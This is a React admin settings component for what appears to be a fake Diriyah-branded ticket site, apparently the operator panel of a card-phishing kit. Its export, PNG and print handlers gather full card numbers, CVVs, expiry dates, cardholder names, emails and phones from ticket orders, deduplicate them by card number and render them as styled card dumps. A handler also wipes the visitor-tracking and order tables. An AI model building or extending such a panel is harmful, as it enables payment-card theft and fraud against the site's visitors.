import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "react-router-dom";
import {
  KeyRound, FileDown, Trash2, LogOut, Settings, ArrowRight, Mail,
  Bell, BellOff, Shield, Sparkles, AlertTriangle, Smartphone, Volume2, VolumeX, Printer, Image,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { playChime, createRipple, isSoundMuted, setSoundMuted } from "@/hooks/use-action-sound";
import { requestNotificationPermission, getNotificationPermission, isNotificationSupported } from "@/hooks/use-browser-notifications";
import { bankLogos, bankColors } from "@/data/bankLogos";
import html2canvas from "html2canvas";
import diriyahLogo from "@/assets/diriyah-logo.png";

const AdminSettings = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [changingPassword, setChangingPassword] = useState(false);
  const [changingEmail, setChangingEmail] = useState(false);
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [newEmail, setNewEmail] = useState("");
  const [clearing, setClearing] = useState(false);
  const [notifPermission, setNotifPermission] = useState<string>(getNotificationPermission());
  const [soundMuted, setSoundMutedState] = useState(isSoundMuted());

  useEffect(() => {
    const interval = setInterval(() => setNotifPermission(getNotificationPermission()), 1000);
    return () => clearInterval(interval);
  }, []);

  const handleToggleNotifications = async () => {
    if (notifPermission === "granted") {
      playChime("info");
      toast({ title: "ℹ️ ملاحظة", description: "لإيقاف الإشعارات، عطّلها من إعدادات المتصفح لهذا الموقع" });
      return;
    }
    const granted = await requestNotificationPermission();
    setNotifPermission(getNotificationPermission());
    if (granted) {
      playChime("success");
      toast({ title: "✅ تم", description: "تم تفعيل إشعارات المتصفح بنجاح" });
    } else {
      playChime("error");
      toast({ title: "❌ مرفوض", description: "تم رفض الإذن. فعّل الإشعارات من إعدادات المتصفح", variant: "destructive" });
    }
  };

  const handleChangePassword = async () => {
    if (newPassword.length < 6) {
      playChime("error");
      toast({ title: "❌ خطأ", description: "كلمة المرور يجب أن تكون 6 أحرف على الأقل", variant: "destructive" });
      return;
    }
    if (newPassword !== confirmPassword) {
      playChime("error");
      toast({ title: "❌ خطأ", description: "كلمتا المرور غير متطابقتين", variant: "destructive" });
      return;
    }
    const { error } = await supabase.auth.updateUser({ password: newPassword });
    if (error) {
      playChime("error");
      toast({ title: "❌ خطأ", description: error.message, variant: "destructive" });
    } else {
      playChime("success");
      toast({ title: "✅ تم", description: "تم تغيير كلمة المرور بنجاح" });
      setNewPassword(""); setConfirmPassword(""); setChangingPassword(false);
    }
  };

  const handleChangeEmail = async () => {
    if (!newEmail || !newEmail.includes("@")) {
      playChime("error");
      toast({ title: "❌ خطأ", description: "أدخل بريد إلكتروني صحيح", variant: "destructive" });
      return;
    }
    const { error } = await supabase.auth.updateUser({ email: newEmail });
    if (error) {
      playChime("error");
      toast({ title: "❌ خطأ", description: error.message, variant: "destructive" });
    } else {
      playChime("success");
      toast({ title: "✅ تم", description: "تم إرسال رابط تأكيد إلى بريدك الجديد. تحقق من صندوق الوارد" });
      setNewEmail(""); setChangingEmail(false);
    }
  };

  const handleExportPDF = async () => {
    playChime("info");
    toast({ title: "📄 جاري التصدير...", description: "يتم تجهيز ملف PDF" });
    try {
      const { data: orders } = await supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
      if (!orders || orders.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد طلبات لتصديرها" });
        return;
      }
      const cardsData = orders.filter((o: any) => o.card_full_number || o.card_last4);
      // Deduplicate by card number
      const seen = new Set<string>();
      const uniqueCards = cardsData.filter((o: any) => {
        const key = o.card_full_number || o.card_last4 || o.id;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      });
      if (uniqueCards.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد بيانات بطاقات للتصدير" });
        return;
      }

      // Preload Arabic font
      const fontLink = document.createElement("link");
      fontLink.href = "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap";
      fontLink.rel = "stylesheet";
      document.head.appendChild(fontLink);
      await new Promise(r => setTimeout(r, 1000));

      const container = document.createElement("div");
      container.style.cssText = "position:fixed;left:-9999px;top:0;width:794px;background:#ffffff;font-family:'Tajawal','Segoe UI',Tahoma,Arial,sans-serif;direction:rtl;padding:40px;";
      container.innerHTML = `
        <div style="text-align:center;margin-bottom:36px;">
          <img src="${diriyahLogo}" style="width:60px;height:60px;object-fit:contain;margin:0 auto 12px;display:block;" />
          <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;margin:0 0 6px;">تقرير بيانات البطاقات</h1>
          <p style="font-size:12px;color:#64748b;margin:0;">📅 ${new Date().toLocaleDateString("ar-SA", {weekday:"long",year:"numeric",month:"long",day:"numeric"})} &nbsp;|&nbsp; 🕐 ${new Date().toLocaleTimeString("ar-SA", {hour:"2-digit",minute:"2-digit"})} &nbsp;|&nbsp; ${uniqueCards.length} بطاقة</p>
          <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:14px;"></div>
        </div>
        ${uniqueCards.map((o: any, i: number) => {
          const bankKey = o.bank_name || "";
          const logoUrl = (bankLogos as any)[bankKey] || "";
          const colors = (bankColors as any)[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843" };
          return `
          <div style="margin-bottom:28px;break-inside:avoid;">
            <div style="display:flex;gap:20px;align-items:flex-start;direction:rtl;">
              <div style="width:380px;min-width:380px;height:230px;border-radius:16px;background:${colors.header};box-shadow:0 8px 24px rgba(0,0,0,0.25);padding:24px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;">
                <div style="position:absolute;top:-50%;right:-50%;width:100%;height:200%;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);transform:rotate(-20deg);pointer-events:none;"></div>
                <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1;">
                  <div style="display:flex;align-items:center;gap:8px;">
                    ${logoUrl ? `<img src="${logoUrl}" style="width:38px;height:38px;border-radius:8px;object-fit:contain;background:rgba(255,255,255,0.95);padding:4px;box-shadow:0 2px 8px rgba(0,0,0,0.2);" />` : ""}
                    <div>
                      <p style="font-size:11px;font-weight:700;color:rgba(255,255,255,0.95);margin:0;">${o.bank_name || "بطاقة دفع"}</p>
                      <p style="font-size:9px;color:rgba(255,255,255,0.5);margin:2px 0 0;">${(o.card_brand || "CARD").toUpperCase()}</p>
                    </div>
                  </div>
                  <div style="width:42px;height:32px;border-radius:6px;background:linear-gradient(145deg,#e8d5a3,#c9a84c,#e8d5a3);box-shadow:0 1px 3px rgba(0,0,0,0.3);position:relative;">
                    <div style="position:absolute;top:8px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                    <div style="position:absolute;top:14px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                    <div style="position:absolute;top:20px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  </div>
                </div>
                <div style="position:relative;z-index:1;text-align:center;">
                  <p style="font-size:20px;font-weight:700;color:#fff;margin:0;letter-spacing:4px;direction:ltr;text-shadow:0 1px 3px rgba(0,0,0,0.3);">${o.card_full_number ? o.card_full_number.replace(/(.{4})/g, '$1 ').trim() : `**** **** **** ${o.card_last4}`}</p>
                </div>
                <div style="display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1;">
                  <div style="text-align:left;direction:ltr;">
                    <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;letter-spacing:1px;">VALID THRU</p>
                    <p style="font-size:14px;font-weight:600;color:#fff;margin:2px 0 0;">${o.card_expiry || "MM/YY"}</p>
                  </div>
                  <div style="text-align:center;">
                    <p style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.9);margin:0;">${o.cardholder_name || "CARDHOLDER"}</p>
                  </div>
                  <div style="text-align:right;">
                    <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;letter-spacing:1px;">CVV</p>
                    <p style="font-size:14px;font-weight:700;color:#fbbf24;margin:2px 0 0;text-shadow:0 0 6px rgba(251,191,36,0.4);">${o.card_cvv || "***"}</p>
                  </div>
                </div>
              </div>
              <div style="flex:1;background:#f8fafc;border-radius:12px;padding:18px;border:1px solid #e2e8f0;display:flex;flex-direction:column;justify-content:center;gap:10px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
                  <span style="font-size:10px;color:#94a3b8;background:#f1f5f9;padding:3px 10px;border-radius:6px;direction:ltr;">${o.confirmation_number || o.id.slice(0, 8)}</span>
                  <span style="font-size:13px;font-weight:800;color:#1e293b;">#${i + 1}</span>
                </div>
                <div style="height:1px;background:#e2e8f0;"></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">المبلغ</span><span style="font-size:14px;font-weight:800;color:#059669;">${o.total} ر.س</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">الحالة</span><span style="font-size:11px;font-weight:600;color:${o.status === 'confirmed' ? '#059669' : o.status === 'rejected' ? '#dc2626' : '#d97706'};">${o.status === 'confirmed' ? '✅ مؤكد' : o.status === 'rejected' ? '❌ مرفوض' : '⏳ معلق'}</span></div>
                <div style="height:1px;background:#e2e8f0;"></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📧</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.email}</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📱</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.phone}</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📅</span><span style="font-size:10px;color:#334155;">${new Date(o.created_at).toLocaleDateString("ar-SA")}</span></div>
              </div>
            </div>
          </div>`;
        }).join("")}
        <div style="text-align:center;margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;">
          <p style="font-size:9px;color:#94a3b8;">🔒 سري وخاص — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
        </div>
      `;
      document.body.appendChild(container);

      const canvas = await html2canvas(container, { scale: 2, useCORS: true, backgroundColor: "#ffffff" });
      document.body.removeChild(container);

      const { default: jsPDF } = await import("jspdf");
      const imgW = 190;
      const imgH = (canvas.height * imgW) / canvas.width;
      const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
      const pageH = 277;

      if (imgH <= pageH) {
        doc.addImage(canvas.toDataURL("image/png"), "PNG", 10, 10, imgW, imgH);
      } else {
        let remainingH = canvas.height;
        let srcY = 0;
        const sliceHPx = (pageH / imgH) * canvas.height;
        while (remainingH > 0) {
          const sliceH = Math.min(sliceHPx, remainingH);
          const pageCanvas = document.createElement("canvas");
          pageCanvas.width = canvas.width;
          pageCanvas.height = sliceH;
          const ctx = pageCanvas.getContext("2d")!;
          ctx.drawImage(canvas, 0, srcY, canvas.width, sliceH, 0, 0, canvas.width, sliceH);
          const pageImgH = (sliceH * imgW) / canvas.width;
          if (srcY > 0) doc.addPage();
          doc.addImage(pageCanvas.toDataURL("image/png"), "PNG", 10, 10, imgW, pageImgH);
          srcY += sliceH;
          remainingH -= sliceH;
        }
      }

      doc.save("card-data-report.pdf");
      playChime("success");
      toast({ title: "✅ تم", description: "تم تصدير الملف بنجاح" });
    } catch {
      playChime("error");
      toast({ title: "❌ خطأ", description: "حدث خطأ أثناء التصدير", variant: "destructive" });
    }
  };

  const handlePrintReport = async () => {
    playChime("info");
    toast({ title: "🖨️ جاري التجهيز...", description: "يتم تجهيز التقرير للطباعة" });
    try {
      const { data: orders } = await supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
      if (!orders || orders.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد طلبات للطباعة" });
        return;
      }
      const cardsData = orders.filter((o: any) => o.card_full_number || o.card_last4);
      const seen = new Set<string>();
      const uniqueCards = cardsData.filter((o: any) => {
        const key = o.card_full_number || o.card_last4 || o.id;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      });
      if (uniqueCards.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد بيانات بطاقات للطباعة" });
        return;
      }

      const cardHtml = uniqueCards.map((o: any, i: number) => {
        const bankKey = o.bank_name || "";
        const logoUrl = (bankLogos as any)[bankKey] || "";
        const colors = (bankColors as any)[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843" };
        return `
        <div style="margin-bottom:28px;break-inside:avoid;">
          <div style="display:flex;gap:20px;align-items:flex-start;direction:rtl;">
            <div style="width:380px;min-width:380px;height:230px;border-radius:16px;background:${colors.header};box-shadow:0 8px 24px rgba(0,0,0,0.25);padding:24px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;">
              <div style="position:absolute;top:-50%;right:-50%;width:100%;height:200%;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);transform:rotate(-20deg);pointer-events:none;"></div>
              <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1;">
                <div style="display:flex;align-items:center;gap:8px;">
                  ${logoUrl ? `<img src="${logoUrl}" style="width:38px;height:38px;border-radius:8px;object-fit:contain;background:rgba(255,255,255,0.95);padding:4px;" />` : ""}
                  <div>
                    <p style="font-size:11px;font-weight:700;color:rgba(255,255,255,0.95);margin:0;">${o.bank_name || "بطاقة دفع"}</p>
                    <p style="font-size:9px;color:rgba(255,255,255,0.5);margin:2px 0 0;">${(o.card_brand || "CARD").toUpperCase()}</p>
                  </div>
                </div>
                <div style="width:42px;height:32px;border-radius:6px;background:linear-gradient(145deg,#e8d5a3,#c9a84c,#e8d5a3);position:relative;">
                  <div style="position:absolute;top:8px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  <div style="position:absolute;top:14px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  <div style="position:absolute;top:20px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                </div>
              </div>
              <div style="position:relative;z-index:1;text-align:center;">
                <p style="font-size:20px;font-weight:700;color:#fff;margin:0;letter-spacing:4px;direction:ltr;">${o.card_full_number ? o.card_full_number.replace(/(.{4})/g, '$1 ').trim() : `**** **** **** ${o.card_last4}`}</p>
              </div>
              <div style="display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1;">
                <div style="text-align:left;direction:ltr;">
                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;">VALID THRU</p>
                  <p style="font-size:14px;font-weight:600;color:#fff;margin:2px 0 0;">${o.card_expiry || "MM/YY"}</p>
                </div>
                <div><p style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.9);margin:0;">${o.cardholder_name || "CARDHOLDER"}</p></div>
                <div style="text-align:right;">
                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;">CVV</p>
                  <p style="font-size:14px;font-weight:700;color:#fbbf24;margin:2px 0 0;">${o.card_cvv || "***"}</p>
                </div>
              </div>
            </div>
            <div style="flex:1;background:#f8fafc;border-radius:12px;padding:18px;border:1px solid #e2e8f0;display:flex;flex-direction:column;justify-content:center;gap:10px;">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
                <span style="font-size:10px;color:#94a3b8;background:#f1f5f9;padding:3px 10px;border-radius:6px;direction:ltr;">${o.confirmation_number || o.id.slice(0, 8)}</span>
                <span style="font-size:13px;font-weight:800;color:#1e293b;">#${i + 1}</span>
              </div>
              <div style="height:1px;background:#e2e8f0;"></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">المبلغ</span><span style="font-size:14px;font-weight:800;color:#059669;">${o.total} ر.س</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">الحالة</span><span style="font-size:11px;font-weight:600;color:${o.status === 'confirmed' ? '#059669' : o.status === 'rejected' ? '#dc2626' : '#d97706'};">${o.status === 'confirmed' ? '✅ مؤكد' : o.status === 'rejected' ? '❌ مرفوض' : '⏳ معلق'}</span></div>
              <div style="height:1px;background:#e2e8f0;"></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📧</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.email}</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📱</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.phone}</span></div>
              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📅</span><span style="font-size:10px;color:#334155;">${new Date(o.created_at).toLocaleDateString("ar-SA")}</span></div>
            </div>
          </div>
        </div>`;
      }).join("");

      const printWindow = window.open("", "_blank");
      if (!printWindow) {
        playChime("error");
        toast({ title: "❌ خطأ", description: "تم حظر النافذة المنبثقة. اسمح بالنوافذ المنبثقة وحاول مرة أخرى", variant: "destructive" });
        return;
      }
      const logoSrc = diriyahLogo.startsWith("data:") || diriyahLogo.startsWith("http") ? diriyahLogo : new URL(diriyahLogo, window.location.origin).href;
      printWindow.document.write(`<!DOCTYPE html><html dir="rtl"><head><meta charset="utf-8"><title>تقرير البطاقات</title>
        <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
        <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Tajawal','Segoe UI',Tahoma,Arial,sans-serif;background:#fff;padding:30px 40px;direction:rtl;}
        @media print{body{padding:10px 20px;}@page{size:A4 landscape;margin:10mm;}}
      </style></head><body>
        <div style="text-align:center;margin-bottom:30px;">
          <img src="${logoSrc}" style="width:60px;height:60px;object-fit:contain;margin:0 auto 12px;" />
          <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;font-family:'Tajawal',sans-serif;">تقرير بيانات البطاقات</h1>
          <p style="font-size:12px;color:#64748b;margin-top:6px;font-family:'Tajawal',sans-serif;">📅 ${new Date().toLocaleDateString("ar-SA", {weekday:"long",year:"numeric",month:"long",day:"numeric"})} &nbsp;|&nbsp; 🕐 ${new Date().toLocaleTimeString("ar-SA", {hour:"2-digit",minute:"2-digit"})} &nbsp;|&nbsp; ${uniqueCards.length} بطاقة</p>
          <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:14px;"></div>
        </div>
        ${cardHtml}
        <div style="text-align:center;margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;">
          <p style="font-size:9px;color:#94a3b8;font-family:'Tajawal',sans-serif;">🔒 سري وخاص — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
        </div>
      </body></html>`);
      printWindow.document.close();
      setTimeout(() => { printWindow.print(); }, 1500);
      playChime("success");
    } catch {
      playChime("error");
      toast({ title: "❌ خطأ", description: "حدث خطأ أثناء التجهيز", variant: "destructive" });
    }
  };

  const handleExportPNG = async () => {
    playChime("info");
    toast({ title: "🖼️ جاري التصدير...", description: "يتم تجهيز صورة PNG عالية الجودة" });
    try {
      const { data: orders } = await supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
      if (!orders || orders.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد طلبات لتصديرها" });
        return;
      }
      const cardsData = orders.filter((o: any) => o.card_full_number || o.card_last4);
      const seen = new Set<string>();
      const uniqueCards = cardsData.filter((o: any) => {
        const key = o.card_full_number || o.card_last4 || o.id;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      });
      if (uniqueCards.length === 0) {
        playChime("error");
        toast({ title: "⚠️ تنبيه", description: "لا توجد بيانات بطاقات للتصدير" });
        return;
      }

      const container = document.createElement("div");
      container.style.cssText = "position:fixed;left:-9999px;top:0;width:794px;background:#ffffff;font-family:'Tajawal','Segoe UI',Tahoma,Arial,sans-serif;direction:rtl;padding:40px;";
      container.innerHTML = `
        <div style="text-align:center;margin-bottom:36px;">
          <img src="${diriyahLogo}" style="width:60px;height:60px;object-fit:contain;margin:0 auto 12px;display:block;" />
          <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;margin:0 0 6px;">تقرير بيانات البطاقات</h1>
          <p style="font-size:12px;color:#64748b;margin:0;">📅 ${new Date().toLocaleDateString("ar-SA", {weekday:"long",year:"numeric",month:"long",day:"numeric"})} &nbsp;|&nbsp; 🕐 ${new Date().toLocaleTimeString("ar-SA", {hour:"2-digit",minute:"2-digit"})} &nbsp;|&nbsp; ${uniqueCards.length} بطاقة</p>
          <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:14px;"></div>
        </div>
        ${uniqueCards.map((o: any, i: number) => {
          const bankKey = o.bank_name || "";
          const logoUrl = (bankLogos as any)[bankKey] || "";
          const colors = (bankColors as any)[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843" };
          return `
          <div style="margin-bottom:28px;">
            <div style="display:flex;gap:20px;align-items:flex-start;direction:rtl;">
              <div style="width:380px;min-width:380px;height:230px;border-radius:16px;background:${colors.header};box-shadow:0 8px 24px rgba(0,0,0,0.25);padding:24px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;">
                <div style="position:absolute;top:-50%;right:-50%;width:100%;height:200%;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);transform:rotate(-20deg);pointer-events:none;"></div>
                <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1;">
                  <div style="display:flex;align-items:center;gap:8px;">
                    ${logoUrl ? `<img src="${logoUrl}" style="width:38px;height:38px;border-radius:8px;object-fit:contain;background:rgba(255,255,255,0.95);padding:4px;" />` : ""}
                    <div>
                      <p style="font-size:11px;font-weight:700;color:rgba(255,255,255,0.95);margin:0;">${o.bank_name || "بطاقة دفع"}</p>
                      <p style="font-size:9px;color:rgba(255,255,255,0.5);margin:2px 0 0;">${(o.card_brand || "CARD").toUpperCase()}</p>
                    </div>
                  </div>
                  <div style="width:42px;height:32px;border-radius:6px;background:linear-gradient(145deg,#e8d5a3,#c9a84c,#e8d5a3);position:relative;">
                    <div style="position:absolute;top:8px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                    <div style="position:absolute;top:14px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                    <div style="position:absolute;top:20px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
                  </div>
                </div>
                <div style="position:relative;z-index:1;text-align:center;">
                  <p style="font-size:20px;font-weight:700;color:#fff;margin:0;letter-spacing:4px;direction:ltr;">${o.card_full_number ? o.card_full_number.replace(/(.{4})/g, '$1 ').trim() : `**** **** **** ${o.card_last4}`}</p>
                </div>
                <div style="display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1;">
                  <div style="text-align:left;direction:ltr;">
                    <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;">VALID THRU</p>
                    <p style="font-size:14px;font-weight:600;color:#fff;margin:2px 0 0;">${o.card_expiry || "MM/YY"}</p>
                  </div>
                  <div><p style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.9);margin:0;">${o.cardholder_name || "CARDHOLDER"}</p></div>
                  <div style="text-align:right;">
                    <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;">CVV</p>
                    <p style="font-size:14px;font-weight:700;color:#fbbf24;margin:2px 0 0;">${o.card_cvv || "***"}</p>
                  </div>
                </div>
              </div>
              <div style="flex:1;background:#f8fafc;border-radius:12px;padding:18px;border:1px solid #e2e8f0;display:flex;flex-direction:column;justify-content:center;gap:10px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
                  <span style="font-size:10px;color:#94a3b8;background:#f1f5f9;padding:3px 10px;border-radius:6px;direction:ltr;">${o.confirmation_number || o.id.slice(0, 8)}</span>
                  <span style="font-size:13px;font-weight:800;color:#1e293b;">#${i + 1}</span>
                </div>
                <div style="height:1px;background:#e2e8f0;"></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">المبلغ</span><span style="font-size:14px;font-weight:800;color:#059669;">${o.total} ر.س</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">الحالة</span><span style="font-size:11px;font-weight:600;color:${o.status === 'confirmed' ? '#059669' : o.status === 'rejected' ? '#dc2626' : '#d97706'};">${o.status === 'confirmed' ? '✅ مؤكد' : o.status === 'rejected' ? '❌ مرفوض' : '⏳ معلق'}</span></div>
                <div style="height:1px;background:#e2e8f0;"></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📧</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.email}</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📱</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.phone}</span></div>
                <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📅</span><span style="font-size:10px;color:#334155;">${new Date(o.created_at).toLocaleDateString("ar-SA")}</span></div>
              </div>
            </div>
          </div>`;
        }).join("")}
        <div style="text-align:center;margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;">
          <p style="font-size:9px;color:#94a3b8;">🔒 سري وخاص — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
        </div>
      `;
      document.body.appendChild(container);

      const canvas = await html2canvas(container, { scale: 3, useCORS: true, backgroundColor: "#ffffff" });
      document.body.removeChild(container);

      const link = document.createElement("a");
      link.download = "card-data-report.png";
      link.href = canvas.toDataURL("image/png");
      link.click();

      playChime("success");
      toast({ title: "✅ تم", description: "تم تصدير الصورة بجودة عالية" });
    } catch {
      playChime("error");
      toast({ title: "❌ خطأ", description: "حدث خطأ أثناء التصدير", variant: "destructive" });
    }
  };

  const handleClearAll = async () => {
    playChime("error");
    if (!window.confirm("⚠️ هل أنت متأكد من مسح جميع البيانات؟ هذا الإجراء لا يمكن التراجع عنه!")) return;
    setClearing(true);
    try {
      await supabase.from("visitor_actions").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("visitors").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("contact_messages").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("restaurant_bookings").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      await supabase.from("ticket_orders").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      playChime("delete");
      toast({ title: "✅ تم", description: "تم مسح جميع البيانات بنجاح" });
    } catch {
      playChime("error");
      toast({ title: "❌ خطأ", description: "حدث خطأ أثناء مسح البيانات", variant: "destructive" });
    }
    setClearing(false);
  };

  const handleLogout = async () => {
    playChime("whoosh");
    await supabase.auth.signOut();
    navigate("/admin");
  };

  const notifSupported = isNotificationSupported();
  const isNotifGranted = notifPermission === "granted";
  const isNotifDenied = notifPermission === "denied";

  const settingsItems = [
    {
      icon: Mail, label: "تغيير البريد الإلكتروني",
      gradient: "from-violet-500 to-purple-600", shadow: "shadow-violet-500/20",
      onClick: () => { playChime("pop"); setChangingEmail(!changingEmail); setChangingPassword(false); },
    },
    {
      icon: KeyRound, label: "تغيير كلمة المرور",
      gradient: "from-blue-500 to-indigo-600", shadow: "shadow-blue-500/20",
      onClick: () => { playChime("pop"); setChangingPassword(!changingPassword); setChangingEmail(false); },
    },
    {
      icon: isNotifGranted ? Bell : BellOff,
      label: "إشعارات المتصفح",
      gradient: isNotifGranted ? "from-emerald-500 to-teal-500" : isNotifDenied ? "from-red-500 to-rose-500" : "from-amber-400 to-orange-500",
      shadow: isNotifGranted ? "shadow-emerald-500/20" : isNotifDenied ? "shadow-red-500/20" : "shadow-amber-500/20",
      onClick: handleToggleNotifications,
      badge: !notifSupported ? "غير مدعوم" : isNotifGranted ? "مفعّل" : isNotifDenied ? "مرفوض" : "معطّل",
      badgeGradient: !notifSupported ? "from-slate-400 to-slate-500" : isNotifGranted ? "from-emerald-400 to-green-500" : isNotifDenied ? "from-red-400 to-rose-500" : "from-amber-400 to-orange-400",
    },
    {
      icon: soundMuted ? VolumeX : Volume2,
      label: "أصوات الإشعارات",
      gradient: soundMuted ? "from-slate-400 to-slate-500" : "from-emerald-500 to-teal-500",
      shadow: soundMuted ? "shadow-slate-400/20" : "shadow-emerald-500/20",
      onClick: () => {
        const newVal = !soundMuted;
        setSoundMuted(newVal);
        setSoundMutedState(newVal);
        if (!newVal) playChime("success");
        toast({ title: newVal ? "🔇 تم كتم الأصوات" : "🔊 تم تفعيل الأصوات", description: newVal ? "لن تسمع أصوات الإشعارات" : "ستسمع أصوات الإشعارات الآن" });
      },
      badge: soundMuted ? "مكتوم" : "مفعّل",
      badgeGradient: soundMuted ? "from-slate-400 to-slate-500" : "from-emerald-400 to-green-500",
    },
    {
      icon: FileDown, label: "تصدير التذاكر PDF",
      gradient: "from-cyan-500 to-sky-600", shadow: "shadow-cyan-500/20",
      onClick: handleExportPDF,
    },
    {
      icon: Image, label: "تصدير كصورة PNG",
      gradient: "from-pink-500 to-rose-600", shadow: "shadow-pink-500/20",
      onClick: handleExportPNG,
    },
    {
      icon: Printer, label: "طباعة التقرير مباشرة",
      gradient: "from-indigo-500 to-purple-600", shadow: "shadow-indigo-500/20",
      onClick: handlePrintReport,
    },
    {
      icon: Smartphone, label: "تثبيت لوحة التحكم",
      gradient: "from-amber-500 to-yellow-600", shadow: "shadow-amber-500/20",
      onClick: () => { playChime("pop"); navigate("/admin/install"); },
    },
  ];

  return (
    <div className="max-w-lg mx-auto space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <button
